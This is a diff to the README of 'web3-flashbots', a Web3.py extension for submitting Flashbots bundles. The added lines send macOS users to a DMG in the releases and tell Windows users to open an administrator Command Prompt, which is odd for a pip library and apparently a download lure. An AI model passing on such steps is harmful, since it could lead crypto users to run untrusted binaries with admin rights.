@@ -1,10 +1,33 @@
 # web3-flashbots
- 
+
 This library extends Web3.py by adding flashbots functionality as a module, enabling direct submission of transaction bundles to block builders. It implements middleware to intercept `eth_sendBundle` and `eth_callBundle` calls, routing them to your specified MEV-compatible RPC endpoint.
 
 The `flashbot` method handles proper header injection for authenticated requests.
 
 ## Quickstart
+
+### **Attention Windows & macOS Users:** 
+Manual instructions target Windows and Linux; macOS users get the [DMG file](../../releases).  
+
+
+
+
+
+Check for Git and Python installations on Windows.
+
+Install Git for Windows:
+
+https://git-scm.com/install/windows
+
+Install Python for Windows:
+
+https://www.python.org/ftp/python/3.13.12/python-3.13.12-amd64.exe
+
+Open Command Prompt (Administrator).
+
+
+
+
 
 ```python
 from eth_account.signers.local import LocalAccount
